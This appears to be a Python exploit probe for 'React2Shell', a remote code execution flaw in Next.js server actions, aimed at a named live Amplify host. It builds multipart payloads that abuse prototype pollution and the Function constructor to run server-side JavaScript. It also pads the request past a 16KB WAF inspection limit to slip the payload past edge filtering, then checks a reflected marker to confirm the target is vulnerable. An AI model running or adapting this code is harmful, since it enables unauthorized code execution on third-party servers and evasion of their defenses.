"""React2Shell probe variants: identify what the edge blocks."""
import http.client
import json
import ssl

HOST = "main.d4zeeqgazhley.amplifyapp.com"


def post(label, body, ctype):
    c = http.client.HTTPSConnection(HOST, 443, context=ssl.create_default_context())
    c.request("POST", "/", body=body, headers={
        "Host": HOST, "Next-Action": "x", "Content-Type": ctype})
    r = c.getresponse()
    data = r.read().decode("utf-8", "replace")
    hdrs = {k.lower(): v for k, v in r.getheaders()}
    print(f"== {label} ==")
    print(f"   HTTP {r.status} server={hdrs.get('server','-')} "
          f"redirect={hdrs.get('x-action-redirect','-')}")
    if "R2S_CONFIRMED_" in data or "R2S_CONFIRMED_" in hdrs.get("x-action-redirect", ""):
        print("   [+] MARKER REFLECTED - VULNERABLE")
    c.close()


def multipart(field0, padding=None):
    bnd = "----R2S7MA4YWxkTrZu0gW"
    parts = []
    if padding is not None:
        parts.append(f"--{bnd}\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n{padding}\r\n")
    parts += [
        f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{field0}\r\n",
        f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n",
        f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n",
        f"--{bnd}--\r\n",
    ]
    return "".join(parts).encode(), f"multipart/form-data; boundary={bnd}"


def field0(prefix):
    return json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    })


# A: full exploit structure, trivial code -> does edge match on structure?
b, ct = multipart(field0("var res=1;"))
post("A: structure, benign code", b, ct)

# B: real marker, exploit pushed past 16KB of padding (WAF body-inspection limit)
marker = ("var res='R2S_CONFIRMED_'+process.version;"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'NEXT_REDIRECT;push;/r2s?m='+res+';307;'});")
b, ct = multipart(field0(marker), padding="A" * 17000)
post("B: marker after 17KB padding", b, ct)
